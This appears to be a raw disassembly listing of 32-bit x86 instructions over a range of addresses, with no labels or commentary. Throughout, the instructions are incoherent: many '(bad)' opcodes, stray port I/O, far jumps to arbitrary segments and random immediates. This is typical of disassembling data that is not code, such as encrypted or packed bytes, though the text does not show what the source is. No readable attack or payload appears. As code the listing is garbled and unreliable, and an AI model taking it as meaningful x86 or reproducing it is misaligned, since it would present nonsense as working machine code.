  409191:	shl    esi,1
  409193:	(bad)  [ebx]
  409195:	aam    0x53
  409197:	test   DWORD PTR [edx],edx
  409199:	(bad)  
  40919a:	mov    ebx,ebx
  40919c:	pop    edx
  40919d:	xor    BYTE PTR [eax+0x7f],al
  4091a0:	mov    edi,0x9562fa3c
  4091a5:	mov    cl,0x7e
  4091a7:	fwait
  4091a8:	scas   al,BYTE PTR es:[edi]
  4091a9:	(bad)  
  4091aa:	call   0x3093d8a1
  4091af:	xor    eax,0xa16b3c43
  4091b4:	push   esi
  4091b5:	push   es
  4091b6:	pop    ss
  4091b7:	sub    al,0xf
  4091b9:	mov    esp,0x197be55e
  4091be:	push   edi
  4091bf:	fs out 0xaa,al
  4091c2:	arpl   bp,sp
  4091c4:	retf   0x82f2
  4091c7:	push   esp
  4091c8:	xor    al,BYTE PTR [ecx]
  4091ca:	icebp  
  4091cb:	in     al,dx
  4091cc:	pop    edi
  4091cd:	push   ds
  4091ce:	xchg   ebx,eax
  4091cf:	push   ebx
  4091d0:	in     al,dx
  4091d1:	(bad)  
  4091d3:	inc    ebx
  4091d4:	test   DWORD PTR [ecx-0x6e5ce22c],edi
  4091da:	sbb    DWORD PTR ss:[edi],ebp
  4091dd:	rol    BYTE PTR [ecx+eiz*8],1
  4091e0:	sbb    al,0x38
  4091e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091e3:	aad    0xaf
  4091e5:	inc    eax
  4091e6:	cli    
  4091e7:	jmp    0x409195
  4091e9:	and    al,cl
  4091eb:	push   cs
  4091ec:	(bad)  
  4091ed:	mov    ds:0xe2bd9e7e,eax
  4091f2:	(bad)  
  4091f3:	enter  0x5326,0x9
  4091f7:	pushf  
  4091f8:	mov    DWORD PTR [ecx],esi
  4091fa:	fiadd  DWORD PTR ds:0x72da52ef
  409200:	cwde   
  409201:	hlt    
  409202:	adc    al,0x6
  409204:	imul   edi,DWORD PTR ds:0x1e5d1c8c,0xac935125
  40920e:	aas    
  40920f:	iret   
  409210:	sahf   
  409211:	int3   
  409212:	push   es
  409213:	sub    dl,BYTE PTR [ecx+0x5e]
  409216:	sub    eax,0x18ddc8c1
  40921b:	daa    
  40921c:	dec    esi
  40921d:	sbb    al,0x61
  40921f:	mov    ecx,0xd46cd97d
  409224:	(bad)  
  409225:	xchg   esp,eax
  409226:	ror    ah,0x3e
  409229:	cmp    BYTE PTR [edx],al
  40922b:	sub    BYTE PTR [ebx+0x20],bh
  40922e:	jae    0x4092a6
  409230:	loope  0x4091db
  409232:	or     DWORD PTR [ebp+0x3b],0xd7d7c481
  409239:	test   BYTE PTR [ebx],dl
  40923b:	push   ds
  40923c:	mov    BYTE PTR [ecx+0x5b050e0c],bl
  409242:	fldcw  WORD PTR [edi]
  409244:	daa    
  409245:	addr16 call 0x1cbd:0x3a19a506
  40924d:	sub    al,0x96
  40924f:	inc    eax
  409250:	lds    esi,FWORD PTR [edi-0x1]
  409253:	push   ss
  409254:	and    eax,0x519f5104
  409259:	in     eax,0x4
  40925b:	and    esp,ebx
  40925d:	loope  0x409237
  40925f:	outs   dx,BYTE PTR ds:[esi]
  409260:	sub    cl,bh
  409262:	pop    ebp
  409263:	or     BYTE PTR [ebp-0x1e70d32d],bl
  409269:	ds cmp al,0xaa
  40926c:	fnstsw WORD PTR [esi+0x69]
  40926f:	test   BYTE PTR [eax],0x82
  409272:	adc    al,0x69
  409274:	(bad)  
  409275:	(bad)  [eax*1-0x36ca15d]
  40927c:	fmul   QWORD PTR ds:0x5036e775
  409282:	mov    ds:0xf1ee9c50,ax
  409288:	mov    eax,ds:0x6b45cfc7
  40928d:	fst    DWORD PTR [ecx+ebp*4-0x2b]
  409291:	fidiv  DWORD PTR [ecx]
  409293:	pusha  
  409294:	pusha  
  409295:	sub    eax,0xc8d0a0b4
  40929a:	lods   eax,DWORD PTR ds:[esi]
  40929b:	loop   0x409224
  40929d:	adc    DWORD PTR [ecx-0xec36953],edx
  4092a3:	rol    DWORD PTR [edi+0x3c21c505],0x57
  4092aa:	add    eax,0x725c6582
  4092af:	inc    ebp
  4092b0:	in     al,dx
  4092b1:	(bad)  
  4092b2:	inc    ebx
  4092b3:	push   edx
  4092b4:	adc    DWORD PTR [esi],0x1bb4fd73
  4092ba:	pop    es
  4092bb:	ss xor eax,0xd3a4a098
  4092c1:	mov    dh,0x47
  4092c3:	push   esp
  4092c4:	ror    BYTE PTR [edi],cl
  4092c6:	int    0xd
  4092c8:	mov    ch,0xe2
  4092ca:	inc    edx
  4092cb:	xchg   edi,eax
  4092cc:	xchg   edi,eax
  4092cd:	sti    
  4092ce:	aad    0xad
  4092d0:	xchg   DWORD PTR [ecx-0x23c2aa89],eax
  4092d6:	jl     0x40927e
  4092d8:	and    ah,al
  4092da:	cmp    eax,DWORD PTR [edx-0x5d]
  4092dd:	ror    bh,1
  4092df:	in     al,dx
  4092e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092e1:	sub    BYTE PTR [edx+0xbe03d13],dh
  4092e7:	or     bl,BYTE PTR [eax+0x70845889]
  4092ed:	(bad)  
  4092ee:	adc    dl,BYTE PTR ds:[ecx-0x1f]
  4092f2:	fld    QWORD PTR [esi+0x5e75312c]
  4092f8:	and    BYTE PTR [ecx-0x33],bl
  4092fb:	fcomp  DWORD PTR [edi]
  4092fd:	lahf   
  4092fe:	fmul   QWORD PTR [esi]
  409300:	sub    BYTE PTR [edi+0x628fa69f],dh
  409306:	jnp    0x4092c4
  409308:	push   es
  409309:	pop    ebx
  40930a:	into   
  40930b:	sbb    eax,0xd5b91b2d
  409310:	sar    edi,1
  409312:	ror    BYTE PTR ds:[ecx+0x44602b1],1
  409319:	push   edx
  40931a:	and    ah,bh
  40931c:	stos   DWORD PTR es:[edi],eax
  40931d:	mov    bl,ch
  40931f:	dec    ebp
  409320:	rcr    DWORD PTR [esi+0x4c7012b7],cl
  409326:	mov    ebx,0x900a04bc
  40932b:	jns    0x4092c8
  40932d:	scas   eax,DWORD PTR es:[edi]
  40932e:	jmp    0xac08:0x21e1f436
  409335:	aas    
  409336:	(bad)  
  409337:	xchg   ebx,eax
  409338:	xchg   ebp,eax
  409339:	add    ah,BYTE PTR [edx+0x21028ba5]
  40933f:	mov    al,ds:0xe4e5eab3
  409344:	iret   
  409345:	pop    ss
  409346:	mov    bh,0xe0
  409348:	in     al,0x3a
  40934a:	inc    edi
  40934b:	mov    al,ds:0x35be8883
  409350:	mov    edi,0xb2afaf7d
  409355:	leave  
  409356:	mov    bh,0x91
  409358:	sub    al,0x92
  40935a:	addr16 enter 0x395a,0xcf
  40935f:	pop    eax
  409360:	(bad)  
  409361:	(bad)  
  409362:	sar    BYTE PTR [ebx],1
  409364:	mov    edi,0x44558a73
  409369:	inc    ebp
  40936a:	mov    cl,0x9e
  40936c:	jne    0x409304
  40936e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40936f:	mov    dh,BYTE PTR [eax]
  409371:	rcr    BYTE PTR ds:0xb341d6b3,cl
  409377:	pop    ecx
  409378:	pop    eax
  409379:	das    
  40937a:	js     0x4093ad
  40937c:	xor    BYTE PTR [edx+edi*4],ch
  40937f:	aad    0x80
  409381:	sbb    al,bl
  409383:	or     bh,bh
  409385:	mov    WORD PTR [ebp+0xb2951c3],fs
  40938b:	sbb    eax,0xd471dcbb
  409390:	xor    BYTE PTR [ebx-0x11508e00],al
  409396:	popa   
  409397:	retf   
  409398:	cmp    di,0x76
  40939c:	and    al,BYTE PTR [edx]
  40939e:	es mov esi,0x4b4d32e5
  4093a4:	sub    ebx,DWORD PTR [ebx+0x17]
  4093a7:	test   DWORD PTR [eax+0x16],ecx
  4093aa:	jns    0x4093a3
  4093ac:	hlt    
  4093ad:	repnz cli 
  4093af:	push   es
  4093b0:	test   cl,bh
  4093b2:	push   cs
  4093b3:	sahf   
  4093b4:	sbb    esi,DWORD PTR [ecx+0x2dcc4f7c]
  4093ba:	add    ebp,DWORD PTR [edi+0x71]
  4093bd:	mov    esi,0xc82c6bc4
  4093c2:	pop    edx
  4093c3:	je     0x40939e
  4093c5:	xor    al,0xc8
  4093c7:	mov    al,0x15
  4093c9:	test   al,0xdf
  4093cb:	popa   
  4093cc:	les    edx,FWORD PTR [edi-0xef85d7c]
  4093d2:	icebp  
  4093d3:	call   0x14f7dcf9
  4093d8:	cmp    eax,0xf9f41ee0
  4093dd:	sbb    al,0x1
  4093df:	aas    
  4093e0:	cmp    al,0xf8
  4093e2:	icebp  
  4093e3:	xor    BYTE PTR [ebx-0x74c29cb2],0x5d
  4093ea:	les    edx,FWORD PTR [edx]
  4093ec:	in     eax,0xf
  4093ee:	fmul   st(1),st
  4093f0:	mov    dh,0xc0
  4093f2:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4093f4:	ins    DWORD PTR es:[edi],dx
  4093f5:	bound  ecx,QWORD PTR [eax]
  4093f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093f8:	fmulp  st(4),st
  4093fa:	sub    DWORD PTR fs:[ebx],esi
  4093fd:	ss mov edi,0xf709d09e
  409403:	mov    fs,ecx
  409405:	xchg   ebx,eax
  409406:	shl    BYTE PTR [ebp+esi*8+0x6a],cl
  40940a:	repnz push esi
  40940c:	and    al,0xd1
  40940e:	leave  
  40940f:	inc    edx
  409410:	mov    eax,0x1dc7d333
  409415:	cmp    eax,0x52f56eb6
  40941a:	pop    ebp
  40941b:	pop    ss
  40941c:	int    0x70
  40941e:	dec    ecx
  40941f:	ss mov esp,0x45d257ae
  409425:	inc    BYTE PTR [ebp+0x36]
  409428:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409429:	fimul  WORD PTR [edi+0x77]
  40942c:	pop    edx
  40942d:	sar    BYTE PTR [ebx],1
  40942f:	mov    bh,0x17
  409431:	xor    BYTE PTR [edx-0x3f],bl
  409434:	jle    0x409492
  409436:	sbb    esi,DWORD PTR [edx]
  409438:	ins    BYTE PTR es:[edi],dx
  409439:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40943a:	out    dx,eax
  40943b:	pop    edi
  40943c:	jp     0x4093da
  40943e:	mov    esi,0xa255b5ac
  409443:	call   0xd446:0xb5cd19bf
  40944a:	jo     0x4094ac
  40944c:	cdq    
  40944d:	dec    ecx
  40944e:	imul   edx,DWORD PTR [ecx+0x61],0xffffffa1
  409452:	jg     0x40944f
  409454:	loopne 0x409448
  409456:	pop    ss
  409457:	aam    0x26
  409459:	xchg   BYTE PTR [ecx+0x67],bl
  40945c:	dec    ah
  40945e:	xlat   BYTE PTR ds:[ebx]
  40945f:	mov    ds:0xfc9a4b94,eax
  409464:	out    dx,eax
  409465:	fs xchg esi,eax
  409467:	or     al,BYTE PTR [edx-0x4644b8ac]
  40946d:	pushf  
  40946e:	fisttp WORD PTR [ebx+0x7e]
  409471:	jmp    DWORD PTR [ecx]
  409473:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  409475:	test   DWORD PTR [ebx+0x646e57a0],edi
  40947b:	iret   
  40947c:	jmp    0x5613ad80
  409481:	add    al,BYTE PTR gs:[edx-0x61c91316]
  409488:	jle    0x4094ad
  40948a:	mov    ecx,0x7b17c5f4
  40948f:	cld    
  409490:	test   eax,0x69ab7a48
  409495:	xor    eax,0x52f4834a
  40949a:	mov    ebx,0x17afbe25
  40949f:	jp     0x409427
  4094a1:	icebp  
  4094a2:	shr    BYTE PTR ds:0x5efd2dab,0xce
  4094a9:	stos   BYTE PTR es:[edi],al
  4094aa:	xlat   BYTE PTR ds:[ebx]
  4094ab:	bswap  ecx
  4094ad:	jo     0x4094f5
  4094af:	sti    
  4094b0:	in     eax,0x51
  4094b2:	enter  0xdbf5,0x7e
  4094b6:	xor    bh,BYTE PTR [edx]
  4094b8:	jp     0x4094f4
  4094ba:	repnz mov bl,0xc4
  4094bd:	ja     0x409536
  4094bf:	push   edi
  4094c0:	inc    ebx
  4094c1:	sti    
  4094c2:	icebp  
  4094c3:	xchg   eax,ebx
  4094c5:	pop    eax
  4094c6:	jmp    0x4094c9
  4094c8:	jns    0x409485
  4094ca:	ret    0xd86b
  4094cd:	push   ss
  4094ce:	pop    ds
  4094cf:	or     al,0x8c
  4094d1:	cmp    eax,0xfa11c125
  4094d6:	or     BYTE PTR [ebx-0x42],bl
  4094d9:	(bad)  
  4094da:	push   ss
  4094db:	push   cs
  4094dc:	(bad)  
  4094dd:	fcomp  DWORD PTR [edi-0x50]
  4094e0:	or     DWORD PTR [ecx+0x4e],eax
  4094e3:	fisubr WORD PTR [esi+0x1ccc5812]
  4094e9:	pop    ss
  4094ea:	mov    cl,0xb2
  4094ec:	lock les ebp,FWORD PTR [edx+0x7ad58ac2]
  4094f3:	ins    DWORD PTR es:[edi],dx
  4094f4:	pop    edi
  4094f5:	test   bh,bh
  4094f7:	mov    eax,0x931c1761
  4094fc:	add    DWORD PTR [edx-0x38],edi
  4094ff:	mov    ch,0x74
  409501:	adc    eax,0x6baec2d9
  409506:	xchg   edx,eax
  409507:	mov    ebx,DWORD PTR [edx]
  409509:	add    BYTE PTR [esi-0x28],ch
  40950c:	adc    eax,DWORD PTR [eax-0x52636999]
  409512:	adc    eax,0x4bbf3e15
  409517:	push   ecx
  409518:	aas    
  409519:	shr    BYTE PTR [esi-0x3c],1
  40951c:	scas   eax,DWORD PTR es:[edi]
  40951d:	push   es
  40951e:	sub    edi,ecx
  409520:	arpl   WORD PTR [esi-0x416db4fe],si
  409526:	jg     0x4094c7
  409528:	push   ds
  409529:	or     BYTE PTR ds:0xc8bec474,ch
  40952f:	hlt    
  409530:	out    0x78,al
  409532:	mov    ch,0x9d
  409534:	sub    BYTE PTR [ebx],cl
  409536:	int3   
  409537:	sub    al,0x2
  409539:	call   0x3309f5de
  40953e:	pushf  
  40953f:	pop    esi
  409540:	jmp    0x4095b3
  409542:	fwait
  409543:	dec    edx
  409544:	dec    ebp
  409545:	mov    cl,0x12
  409547:	pushf  
  409548:	loopne 0x4094d3
  40954a:	rol    BYTE PTR [ebx+0xf],cl
  40954d:	inc    ebx
  40954e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40954f:	dec    ebx
  409550:	mov    esi,0x2d9647fb
  409555:	xor    bl,BYTE PTR [esp+edx*8+0x731345c7]
  40955c:	pop    ecx
  40955d:	cwde   
  40955e:	(bad)  
  409560:	cmp    cl,ch
  409562:	aam    0x87
  409564:	out    dx,eax
  409565:	(bad)  
  409566:	xor    bl,BYTE PTR [edi]
  409568:	retf   0xe480
  40956b:	jnp    0x409591
  40956d:	out    0x3f,eax
  40956f:	in     eax,0x74
  409571:	xlat   BYTE PTR ds:[ebx]
  409572:	mov    DWORD PTR [esp+edx*1+0x2],ecx
  409576:	cdq    
  409577:	jmp    0x30bf:0xf843ed31
  40957e:	mov    edi,0xde542b87
  409583:	ror    dh,0xa0
  409586:	xchg   esp,eax
  409587:	adc    eax,0x90c8606f
  40958c:	pop    ebp
  40958d:	push   cs
  40958e:	jbe    0x4095ca
  409590:	adc    bl,BYTE PTR [edx+0x37]
  409593:	xor    eax,0xb952cbcb
  409598:	sub    al,0x6f
  40959a:	sar    DWORD PTR [edx+0x5f],cl
  40959d:	add    DWORD PTR ds:0xb067d20b,edx
  4095a3:	(bad)
  4095a7:	outs   dx,BYTE PTR ds:[esi]
  4095a8:	je     0x40953a
  4095aa:	jno    0x40959b
  4095ac:	pop    ds
  4095ad:	sub    cl,cl
  4095af:	add    ch,ah
  4095b1:	pop    eax
  4095b2:	out    0xea,eax
  4095b4:	sahf   
  4095b5:	push   ds
  4095b6:	adc    dh,BYTE PTR [eax-0xf]
  4095b9:	in     eax,0xe9
  4095bb:	fs push ebp
  4095bd:	add    DWORD PTR [edi-0x6ef59d03],esp
  4095c3:	in     eax,0xc
  4095c5:	fcomp  QWORD PTR [eax-0x4b25455b]
  4095cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095cc:	arpl   si,bx
  4095ce:	cmp    dl,0x46
  4095d1:	mov    ah,0xba
  4095d3:	cmp    al,0x5
  4095d5:	cmp    edx,DWORD PTR [eax]
  4095d7:	jmp    0x4534b124
  4095dc:	inc    eax
  4095dd:	sub    ah,BYTE PTR [edx+0x39]
  4095e0:	cwde   
  4095e1:	and    BYTE PTR [edi+0x5a418c0b],ah
  4095e7:	xor    eax,0x5d1fb871
  4095ec:	dec    ebx
  4095ed:	pop    ecx
  4095ee:	int3   
  4095ef:	jne    0x409636
  4095f1:	xchg   edi,eax
  4095f2:	pop    edi
  4095f3:	add    ebx,DWORD PTR [eax-0x4]
  4095f6:	sub    edx,esp
  4095f8:	sbb    eax,DWORD PTR [ebx*4+0x3b2af96e]
  4095ff:	fcmovnu st,st(4)
  409601:	dec    ebp
  409602:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409603:	dec    ebx
  409604:	shl    BYTE PTR [ecx-0x5e],1
  409607:	mov    cl,BYTE PTR [esi+0x29]
  40960a:	jo     0x40967c
  40960c:	add    al,0x17
  40960e:	icebp  
  40960f:	pop    esi
  409610:	inc    edx
  409611:	pop    eax
  409612:	jnp    0x40966e
  409614:	mov    eax,0xbd7b2917
  409619:	lods   ax,WORD PTR ds:[esi]
  40961b:	add    ebp,DWORD PTR [ecx-0x3383e189]
  409621:	aad    0x8
  409623:	xor    cl,dl
  409625:	enter  0x626,0x8a
  409629:	cmp    BYTE PTR [ebx-0xe],bl
  40962c:	(bad)
  409630:	sbb    edx,DWORD PTR [edx+ebp*1]
  409633:	out    0xb8,al
  409635:	mov    bh,0x1e
  409637:	inc    eax
  409638:	sub    eax,0x5145401f
  40963d:	fistp  QWORD PTR [eax-0x5]
  409640:	or     ch,BYTE PTR [ebx-0x76]
  409643:	pop    ebx
  409644:	dec    ebp
  409645:	div    DWORD PTR [ebx-0x3d]
  409648:	(bad)  [eax-0x5ae99eae]
  40964e:	add    al,0xdb
  409650:	loope  0x409663
  409652:	retf   0xc819
  409655:	pusha  
  409656:	scas   al,BYTE PTR es:[edi]
  409657:	stc    
  409658:	mov    dh,0x12
  40965a:	push   esi
  40965b:	jb     0x40960c
  40965d:	xchg   ebx,eax
  40965e:	pop    DWORD PTR [esp+ecx*2+0x4e]
  409662:	sahf   
  409663:	sbb    DWORD PTR [edx-0x297c451d],edi
  409669:	pop    esi
  40966a:	adc    al,0x9b
  40966c:	xchg   BYTE PTR [ebp-0x7c],al
  40966f:	out    0x3d,eax
  409671:	jb     0x409642
  409673:	test   al,0xba
  409675:	aam    0xe0
  409677:	or     bh,BYTE PTR [esp-0x4e]
  40967b:	sbb    ebp,DWORD PTR [ecx+0x76]
  40967e:	fisub  DWORD PTR [ebp+0x5397a269]
  409684:	mov    esi,0x5b081a3c
  409689:	sub    edx,esi
  40968b:	jmp    0x4096f8
  40968d:	mov    eax,ds:0x663bb2be
  409692:	pop    ds
  409693:	inc    edi
  409694:	inc    ebx
  409695:	std    
  409696:	cli    
  409697:	inc    ebp
  409698:	dec    ebx
  409699:	pop    es
  40969a:	mov    edi,0xec17c2fd
  40969f:	mov    ecx,0x76bc0e27
  4096a4:	jb     0x4096cd
  4096a6:	and    eax,0x52b5630b
  4096ab:	aaa    
  4096ac:	pop    esi
  4096ad:	cmp    eax,0xba010779
  4096b2:	mov    eax,ds:0x2fb81872
  4096b7:	aas    
  4096b8:	fs scas al,BYTE PTR es:[edi]
  4096ba:	xchg   esi,eax
  4096bb:	(bad)  
  4096bc:	in     eax,0xf8
  4096be:	mov    al,ds:0x4aed883f
  4096c3:	inc    esp
  4096c4:	test   BYTE PTR [ecx+0x41],ah
  4096c7:	sub    al,0x86
  4096c9:	inc    ecx
  4096ca:	mov    esp,0xf96fef76
  4096cf:	icebp  
  4096d0:	dec    ebp
  4096d1:	mov    edx,0xb6d65d56
  4096d6:	dec    ebx
  4096d7:	outs   dx,BYTE PTR ds:[esi]
  4096d8:	sub    al,0xa9
  4096da:	adc    BYTE PTR [ebx+ebx*8],bl
  4096dd:	neg    ebp
  4096df:	adc    ebp,DWORD PTR [eax]
  4096e1:	adc    DWORD PTR [eax-0x14],eax
  4096e4:	xor    edi,edx
  4096e6:	jge    0x4096b9
  4096e8:	test   DWORD PTR [esp+0x3d9aaf1b],ecx
  4096ef:	push   0x1a
  4096f1:	(bad)  
  4096f2:	cmc    
  4096f3:	pop    ecx
  4096f4:	mov    ebx,0x46c635ff
  4096f9:	mov    cl,0x16
  4096fb:	arpl   WORD PTR [eax],cx
  4096fd:	sub    ebp,DWORD PTR [ecx+0xd]
  409700:	arpl   WORD PTR [ebx-0x22],di
  409703:	call   0xe254a5f4
  409708:	enter  0x5d67,0x69
  40970c:	add    BYTE PTR [edx],al
  40970e:	push   cs
  40970f:	frstor [edi+0x17]
  409712:	xchg   edi,eax
  409713:	jne    0x409747
  409715:	out    0x91,eax
  409717:	push   0x6134ba2c
  40971c:	iret   
  40971d:	(bad)  
  40971e:	and    eax,0x116e49ed
  409723:	gs sub eax,0x2116020d
  409729:	cmp    eax,0x3f0a4b41
  40972e:	sub    BYTE PTR [eax+ecx*1],al
  409731:	pop    edi
  409732:	sub    eax,0x331cd01c
  409737:	xchg   DWORD PTR [eax-0x9a5e350],esi
  40973d:	cmp    ebp,esi
  40973f:	outs   dx,DWORD PTR ds:[esi]
  409740:	jne    0x4096e9
  409742:	xchg   ecx,eax
  409743:	mov    ecx,0xf03c6ed5
  409748:	imul   eax,DWORD PTR [ecx+0x2],0x12f793b8
  40974f:	mov    dh,0x68
  409751:	fcmovnbe st,st(0)
  409753:	das    
  409754:	push   ss
  409755:	popa   
  409756:	xor    al,0xed
  409758:	(bad)  
  409759:	jmp    0xba7b2c5b
  40975e:	dec    ecx
  40975f:	mov    DWORD PTR [esi],eax
  409761:	sbb    al,ch
  409763:	imul   ebp,DWORD PTR [esi-0x4eccee31],0x8e5a5cde
  40976d:	loopne 0x409782
  40976f:	cmp    edx,0x52c3e8cd
  409775:	lahf   
  409776:	push   edx
  409777:	and    BYTE PTR [edi+0x3c7df275],ch
  40977d:	push   edx
  40977e:	push   edx
  40977f:	push   ebx
  409780:	or     ecx,DWORD PTR [eax-0x1]
  409783:	mov    bl,BYTE PTR [ecx]
  409785:	push   eax
  409786:	xor    al,0x6d
  409788:	jp     0x4097f3
  40978a:	xchg   BYTE PTR [eax+0x5401a7c8],ah
  409790:	std    
  409791:	mov    bh,0x8c
  409793:	sub    BYTE PTR [esi+0x7b],al
  409796:	add    BYTE PTR [ebx+0x487e62e3],bl
  40979c:	sahf   
  40979d:	les    eax,FWORD PTR [ecx]
  40979f:	xchg   eax,edx
  4097a1:	mov    bh,0x41
  4097a3:	scas   eax,DWORD PTR es:[edi]
  4097a4:	int    0x25
  4097a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4097a7:	mov    DWORD PTR [ebp+0x8],edi
  4097aa:	mov    eax,ds:0xd3fd6d47
  4097af:	push   0xffffff83
  4097b1:	call   0x64cf:0x3bbe05d
  4097b8:	jmp    0xb264:0xad128e59
  4097bf:	ss js  0x40978e
  4097c2:	cmp    bl,BYTE PTR [ebx]
  4097c4:	(bad)  
  4097c5:	loop   0x409846
  4097c7:	ja     0x409848
  4097c9:	push   ss
  4097ca:	loopne 0x40979e
  4097cc:	imul   eax,edi,0xffffffc4
  4097cf:	cmp    al,0x99
  4097d1:	adc    dl,bl
  4097d3:	mov    esi,0xf6f70e5c
  4097d8:	push   esp
  4097d9:	test   BYTE PTR [ebp+0x58],dh
  4097dc:	adc    eax,0xf735a774
  4097e1:	sub    eax,0x9ce05de5
  4097e6:	sbb    DWORD PTR [edx+0x4],0x66
  4097ea:	aaa    
  4097eb:	call   0x7973:0xed178e3c
  4097f2:	fst    DWORD PTR [eax+0x5]
  4097f5:	cmp    BYTE PTR [edi-0x5c],ch
  4097f8:	jl     0x40985a
  4097fa:	int    0x4f
  4097fc:	add    ebp,DWORD PTR [ebx-0x62]
  4097ff:	imul   eax,DWORD PTR [edi+0x1122434d],0x723ccf2c
  409809:	cmp    BYTE PTR [ebp+0x48],cl
  40980c:	and    eax,0x9aa2c345
  409811:	xchg   ebp,eax
  409812:	div    BYTE PTR [ebx]
  409814:	or     al,0x69
  409816:	ins    BYTE PTR es:[edi],dx
  409817:	mov    eax,edx
  409819:	lea    esi,[edi+0x5fb00b2f]
  40981f:	aas    
  409820:	push   ebp
  409821:	stos   BYTE PTR es:[edi],al
  409822:	imul   esi,ebp,0xe011e239
  409828:	xchg   DWORD PTR [edi+eax*8-0x183f512c],ebp
  40982f:	add    DWORD PTR [esi+0xce2dd11],edi
  409835:	cmp    BYTE PTR [ebp+0x5aae17bf],cl
  40983b:	and    DWORD PTR [ecx-0x4f],edx
  40983e:	xchg   edi,eax
  40983f:	(bad)  
  409840:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409841:	cwde   
  409842:	or     BYTE PTR [eax+0x43],dl
  409845:	repz jns 0x4097f6
  409848:	repnz gs enter 0x6a6a,0x29
  40984e:	inc    esp
  40984f:	inc    ebp
  409850:	xchg   ebx,eax
  409851:	shl    DWORD PTR [eax],0x2b
  409854:	adc    al,0xe0
  409856:	pop    edx
  409857:	push   esi
  409858:	shl    edx,0x8f
  40985b:	pop    ebx
  40985c:	pushf  
  40985d:	int3   
  40985e:	mov    eax,0xbb26ebe1
  409863:	hlt    
  409864:	into   
  409865:	jl     0x409828
  409867:	cmp    ebx,esp
  409869:	sbb    DWORD PTR [edx],edi
  40986b:	das    
  40986c:	mov    esi,0xebbacf6a
  409871:	jecxz  0x4098bc
  409873:	je     0x409847
  409875:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409876:	xchg   ecx,ebp
  409878:	add    eax,0xc408bcfc
  40987d:	push   ebx
  40987e:	pusha  
  40987f:	pop    ebp
  409880:	loop   0x4098ff
  409882:	sbb    bl,BYTE PTR [ebp-0x53]
  409885:	mov    eax,ds:0x323fad84
  40988a:	div    DWORD PTR [esi]
  40988c:	sub    al,0x1f
  40988e:	dec    ecx
  40988f:	mov    edi,ecx
  409891:	out    0x84,al
  409893:	dec    ebp
  409895:	sbb    al,0xa8
  409897:	mov    edx,0x2c3d957c
  40989c:	xor    al,0x26
  40989e:	adc    ebx,DWORD PTR ds:0x483c7cfd
  4098a4:	adc    cl,bl
  4098a6:	and    eax,0x416af7de
  4098ab:	jb     0x409883
  4098ad:	clc    
  4098ae:	mov    DWORD PTR [edi],edi
  4098b0:	jno    0x40992d
  4098b2:	cli    
  4098b3:	popf   
  4098b4:	mov    ds:0x92df7a3a,al
  4098b9:	mov    edx,0xf94aab31
  4098be:	ret    
  4098bf:	mov    esi,fs
  4098c1:	adc    BYTE PTR ds:0xaf49b2a6,bh
  4098c7:	les    eax,FWORD PTR [eax]
  4098c9:	or     al,0x30
  4098cb:	dec    edi
  4098cc:	lods   eax,DWORD PTR ds:[esi]
  4098cd:	inc    eax
  4098ce:	mov    cl,0x4b
  4098d0:	add    esp,DWORD PTR [edi]
  4098d2:	or     DWORD PTR [ebx+0x25],edx
  4098d5:	stc    
  4098d6:	popf   
  4098d7:	jmp    0x40988a
  4098d9:	sbb    eax,0x7596813a
  4098de:	adc    DWORD PTR [ecx-0x3f],ecx
  4098e1:	push   0x824066f1
  4098e6:	popf   
  4098e7:	(bad)  
  4098e8:	das    
  4098e9:	inc    ecx
  4098ea:	gs xchg ecx,eax
  4098ec:	popf   
  4098ed:	ss stc 
  4098ef:	jle    0x40992f
  4098f1:	xor    eax,0x67a1601d
  4098f6:	or     eax,0x66cf50e8
  4098fb:	push   edx
  4098fc:	ins    DWORD PTR es:[edi],dx
  4098fd:	jle    0x409920
  4098ff:	jl     0x4098b3
  409901:	add    edx,ebp
  409903:	mov    esp,0x9801120b
  409908:	pop    es
  409909:	dec    edx
  40990a:	pop    esp
  40990b:	mov    dl,0xdf
  40990d:	or     ebp,DWORD PTR [eax+0x66561bc3]
  409913:	(bad)  
  409914:	(bad)  
  409915:	outs   dx,BYTE PTR ds:[esi]
  409916:	pop    ebx
  409917:	cli    
  409918:	imul   ch
  40991a:	nop
  40991b:	std    
  40991c:	lahf   
  40991d:	out    0x56,al
  40991f:	pop    ss
  409920:	mov    BYTE PTR [eax-0x5179634d],bh
  409926:	xchg   edi,eax
  409927:	mov    esi,0xc9316499
  40992c:	aas    
  40992d:	dec    ecx
  40992e:	test   al,0xf1
  409930:	stc    
  409931:	inc    edx
  409932:	push   esp
  409933:	or     edx,ebx
  409935:	add    BYTE PTR [ebp+0x28],0x61
  409939:	dec    esi
  40993a:	sar    BYTE PTR [edx+edx*4-0x58d80de9],cl
  409941:	fsub   QWORD PTR [edi]
  409943:	add    DWORD PTR fs:[ebp-0x749d92a1],ebx
  40994a:	pop    esi
  40994b:	xor    eax,0x54352d88
  409950:	cmp    BYTE PTR [eax+edi*1+0x18],cl
  409954:	push   es
  409955:	jge    0x4099a8
  409957:	push   esp
  409958:	inc    esi
  409959:	dec    eax
  40995a:	enter  0x8984,0x32
  40995e:	mov    edx,0xed8a3679
  409963:	jne    0x409958
  409965:	stos   DWORD PTR es:[edi],eax
  409966:	and    cl,bh
  409968:	cmp    DWORD PTR [esi+0x64c5f808],esp
  40996e:	push   ebx
  40996f:	pop    esp
  409970:	dec    edi
  409971:	inc    ebp
  409972:	pop    edx
  409973:	or     BYTE PTR [eax],cl
  409975:	imul   edx,DWORD PTR [ebx-0x4bfa3062],0x5da94991
  40997f:	pop    es
  409980:	jnp    0x40994f
  409982:	jne    0x409977
  409984:	push   es
  409985:	or     bh,BYTE PTR [esi+edi*2-0x22]
  409989:	jge    0x409985
  40998b:	je     0x40992b
  40998d:	fs push edi
  40998f:	clc    
